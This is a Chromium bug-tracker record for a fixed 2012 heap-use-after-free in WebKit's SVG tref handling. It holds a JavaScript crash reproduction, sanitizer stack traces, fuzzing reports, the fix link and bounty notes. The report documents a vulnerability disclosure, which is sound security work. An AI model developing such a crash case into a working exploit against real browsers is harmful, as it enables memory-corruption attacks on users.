# Heap-use-after-free in WebCore::SVGTRefElement::updateReferencedText

| Field | Value |
|-------|-------|
| **Issue ID** | [40064174](https://issues.chromium.org/issues/40064174) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | fm...@chromium.org |
| **Created** | 2012-08-20 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebCore::SVGTRefElement::updateReferencedText

**VERSION**  

Chrome Version: dev  

Operating System: linux 64bit

**REPRODUCTION CASE**

<html>
<head>
<style>
</style>
<script>
onload = function() {
document.body.appendChild(document.createElement('input'))
el0=document.createElementNS('http://www.w3.org/2000/svg', 'svg')
document.body.appendChild(el0)
el1=document.createElementNS('http://www.w3.org/2000/svg', 'g')
el0.appendChild(el1)
el2=document.createElementNS('http://www.w3.org/2000/svg', 'tref')
el2.setAttributeNS('http://www.w3.org/1999/xlink', 'xlink:href', '#el3')
el1.appendChild(el2)
document.body.appendChild(document.createElement('input'))
el3=document.createElementNS('http://www.w3.org/2000/svg', 'g')
el3.setAttribute('id','el3')
el1.appendChild(el3)
document.designMode='on'
document.execCommand('selectall')
document.execCommand('FormatBlock', false, '<'+'pre>')
document.execCommand('Undo')
document.execCommand('italic')
el3.setAttribute('x', 'y')
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: asan + renderer  

Crash State:

==1450== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffed5544a0 at pc 0x55555c54505b bp 0x7fffffff7390 sp 0x7fffffff7388  

READ of size 8 at 0x7fffed5544a0 thread T0  

#0 0x55555c54505a in WebCore::SVGTRefElement::updateReferencedText() ???:0  

#1 0x555559af9daa in WebCore::EventTarget::fireEventListeners(WebCore::Event\*, WebCore::EventTargetData\*, WTF::Vector<WebCore::RegisteredEventListener, 1ul>&) ???:0

0x7fffed5544a0 is located 32 bytes inside of 512-byte region [0x7fffed554480,0x7fffed554680)  

freed by thread T0 here:  

#0 0x55555f1538e0 in operator delete(void\*) ??:0  

#1 0x555559a342d5 in WebCore::ContainerNode::removeAllChildren() ???:0  

#2 0x555559a352f3 in WebCore::ContainerNode::~ContainerNode() ???:0

## Attachments

- [tref.html](attachments/tref.html) (text/html; charset=us-ascii, 1.0 KB)
- [tref.txt](attachments/tref.txt) (text/x-c; charset=us-ascii, 8.7 KB)

## Timeline

### in...@chromium.org (2012-08-20)

Florin, i think this is the one i was discussing with you the other day and the one that wasn't getting properly minimized in ClusterFuzz. ClusterFuzz report here - https://cluster-fuzz.appspot.com/testcase?key=94232628. Thanks to miaubiz, we have a good repro above.

### in...@chromium.org (2012-08-20)

[Empty comment from Monorail migration]

### fm...@chromium.org (2012-08-20)

I'm on it. FWIW, this hits an assert on debug builds:


ASSERTION FAILED: isAttached()
../../third_party/WebKit/Source/WebCore/svg/SVGTRefElement.cpp(131) : virtual void WebCore::SVGTRefTargetEventListener::handleEvent(WebCore::ScriptExecutionContext*, WebCore::Event*)
1   0x7fead35f6440
2   0x7fead320a232
3   0x7fead320a078
4   0x7fead3235b03
5   0x7fead31f8be5
6   0x7fead31fbbb7
7   0x7fead31faf4d
8   0x7fead31f8f96
9   0x7fead31f9f54
10  0x7fead325e702
11  0x7fead325e605
12  0x7fead325e7c4
13  0x7fead315d6b5
14  0x7fead3be6f1b
15  0x7fead3be6a18
16  0x7fead3c1f76e
17  0x7fead3c230c0
18  0x7fead319e9c5
19  0x7fead449e805
20  0x7fead8e766f4
21  0x7fead8e7150d
22  0x7fead8e714de
23  0x3522d610618e
[20834:20834:3358433978076:ERROR:process_util_posix.cc(143)] Received signal 11
	base::debug::StackTrace::StackTrace() [0x7fead78c1ea6]
	base::(anonymous namespace)::StackDumpSignalHandler() [0x7fead7928ffd]
	0x7feaccea94c0
	WebCore::SVGTRefTargetEventListener::handleEvent() [0x7fead35f644a]
	WebCore::EventTarget::fireEventListeners() [0x7fead320a232]
	WebCore::EventTarget::fireEventListeners() [0x7fead320a078]
	WebCore::Node::handleLocalEvents() [0x7fead3235b03]
	WebCore::EventContext::handleLocalEvents() [0x7fead31f8be5]
	WebCore::EventDispatcher::dispatchEventAtTarget() [0x7fead31fbbb7]
	WebCore::EventDispatcher::dispatchEvent() [0x7fead31faf4d]
	WebCore::EventDispatchMediator::dispatchEvent() [0x7fead31f8f96]
	WebCore::EventDispatcher::dispatchEvent() [0x7fead31f9f54]
	WebCore::ScopedEventQueue::dispatchEvent() [0x7fead325e702]
	WebCore::ScopedEventQueue::dispatchAllEvents() [0x7fead325e605]
	WebCore::ScopedEventQueue::decrementScopingLevel() [0x7fead325e7c4]
	WebCore::EventQueueScope::~EventQueueScope() [0x7fead315d6b5]
	WebCore::CompositeEditCommand::apply() [0x7fead3be6f1b]
	WebCore::applyCommand() [0x7fead3be6a18]
	WebCore::executeFormatBlock() [0x7fead3c1f76e]
	WebCore::Editor::Command::execute() [0x7fead3c230c0]
	WebCore::Document::execCommand() [0x7fead319e9c5]
	WebCore::DocumentV8Internal::execCommandCallback() [0x7fead449e805]
	v8::internal::HandleApiCallHelper<>() [0x7fead8e766f4]
	v8::internal::Builtin_Impl_HandleApiCall() [0x7fead8e7150d]
	v8::internal::Builtin_HandleApiCall() [0x7fead8e714de]
	0x3522d610618e


### in...@chromium.org (2012-08-20)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=94473071

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7fd88fc13ca0
Crash State:
  - crash stack -
  WebCore::SVGTRefElement::updateReferencedText
  WebCore::EventTarget::fireEventListeners
  - free stack -
  WebCore::ContainerNode::removeAllChildren
  WebCore::ContainerNode::~ContainerNode
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=150061:150063

Minimized Testcase (0.96 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv959DKdfPUm6Aj2ogEVjZiNtlVJDc-IZVoO28HwZfLMGDMXmP5MKbfUmMPI7i1JTv2tie7jRGTenMxHHqJy1afeiMALAspEDrhVqEL2rYr21-7Y7_r3OVDMN7gYmtrZWUfx16uE6W6qzf8rkcC0hgGwq7bqlzorJsPzC4LZi-cclpdmVGVM
<script>
      onload = function() {
        document.body.appendChild(document.createElement('input'))
        el0=document.createElementNS('http://www.w3.org/2000/svg', 'svg')
        document.body.appendChild(el0)
        el1=document.createElementNS('http://www.w3.org/2000/svg', 'g')
        el0.appendChild(el1)
        el2=document.createElementNS('http://www.w3.org/2000/svg', 'tref')
        el2.setAttributeNS('http://www.w3.org/1999/xlink', 'xlink:href', '#el3')
        el1.appendChild(el2)
        document.body.appendChild(document.createElement('input'))
        el3=document.createElementNS('http://www.w3.org/2000/svg', 'g')
        el3.setAttribute('id','el3')
        el1.appendChild(el3)
        document.designMode='on'
        document.execCommand('selectall')
        document.execCommand('FormatBlock', false, '<'+'pre>')
        document.execCommand('Undo')
        document.execCommand('italic')
        el3.setAttribute('x', 'y')
      }
    </script>

### fm...@chromium.org (2012-08-20)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-08-20)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-08-21)

http://trac.webkit.org/changeset/126205

### cl...@chromium.org (2012-08-22)

ClusterFuzz has detected this issue as fixed in range 152720:152740.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=94473071

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7fd88fc13ca0
Crash State:
  - crash stack -
  WebCore::SVGTRefElement::updateReferencedText
  WebCore::EventTarget::fireEventListeners
  - free stack -
  WebCore::ContainerNode::removeAllChildren
  WebCore::ContainerNode::~ContainerNode
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=150061:150063
Fixed: https://cluster-fuzz.appspot.com/revisions?range=152720:152740

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv959DKdfPUm6Aj2ogEVjZiNtlVJDc-IZVoO28HwZfLMGDMXmP5MKbfUmMPI7i1JTv2tie7jRGTenMxHHqJy1afeiMALAspEDrhVqEL2rYr21-7Y7_r3OVDMN7gYmtrZWUfx16uE6W6qzf8rkcC0hgGwq7bqlzorJsPzC4LZi-cclpdmVGVM

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2012-08-25)

M22: http://trac.webkit.org/changeset/126672

### sc...@gmail.com (2012-09-25)

$1000

### sc...@gmail.com (2012-10-16)

Paid in a batch of $1000, sorry for the fragmentation.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/143656?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40064174)*
